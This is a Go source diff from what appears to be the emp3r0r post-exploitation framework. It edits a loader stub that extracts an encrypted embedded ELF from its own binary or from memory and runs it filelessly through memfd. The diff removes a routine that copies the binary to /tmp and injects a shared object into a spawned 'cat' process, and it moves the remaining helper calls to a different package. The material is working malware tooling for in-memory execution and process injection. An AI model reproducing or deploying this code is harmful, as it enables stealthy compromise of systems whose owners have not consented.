@@ -13,7 +13,6 @@ import (
 	"syscall"
 	"unsafe"
 
-	"github.com/jm33-m0/emp3r0r/core/lib/agent"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -88,30 +87,13 @@ func memfd_exec(procName string, buffer []byte) {
 	}
 }
 
-func inject_and_run() (err error) {
-	cmd := exec.Command("cat")
-	err = cmd.Run()
-	if err != nil {
-		return
-	}
-	go func(e error) {
-		for cmd.Process != nil {
-			agent.CopySelfTo("/tmp/emp3r0r")
-			e = agent.InjectSO(cmd.Process.Pid)
-			break
-		}
-	}(err)
-
-	return
-}
-
 func main() {
 	// find embeded ELF
-	encElfBytes, err := agent.DigEmbeddedDataFromArg0()
+	encElfBytes, err := util.DigEmbeddedDataFromArg0()
 	if err != nil {
 		e := err
 		log.Printf("DigEmbeddedDataFromArg0: %v", err)
-		encElfBytes, err = agent.DigEmbededDataFromMem()
+		encElfBytes, err = util.DigEmbededDataFromMem()
 		if err != nil {
 			log.Fatalf("DigEmbeddedDataFromArg0: %v. DigEmbededDataFromMem: %v", e, err)
 		}
@@ -143,18 +125,8 @@ func main() {
 	if err != nil {
 		log.Printf("read self: %v", err)
 	}
-	fd := agent.MemFDWrite(self_elf_data)
+	fd := util.MemFDWrite(self_elf_data)
 	if fd < 0 {
 		log.Print("MemFDWrite failed")
-	}
-
-	// inject self to a cat process
-	// check path hash to make sure we don't get trapped in a dead loop
-	path_hash := tun.SHA256Sum(fmt.Sprintf("emp3r0r_salt:%s", os.Getenv("PATH")))
-	if path_hash != "f74980d53e01a9ca2078f3894390606d4ecc1b0fc70d284faa16043d718ad0a5" {
-		err = inject_and_run()
-		if err != nil {
-			log.Print(err)
-		}
 	}
 }
